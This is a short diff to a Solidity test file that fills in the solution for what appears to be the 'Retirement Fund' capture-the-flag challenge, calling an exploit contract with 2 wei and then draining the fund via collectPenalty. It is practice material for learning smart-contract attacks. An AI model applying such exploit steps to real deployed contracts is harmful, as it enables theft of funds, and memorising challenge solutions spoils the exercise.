@@ -20,6 +20,8 @@ contract RetirementFundTest is Test {
         // Use the instance retirementFund and exploitContract
 
         // Put your solution here
+        exploitContract.exploit{value: 2}();
+        retirementFund.collectPenalty();
 
         _checkSolved();
     }
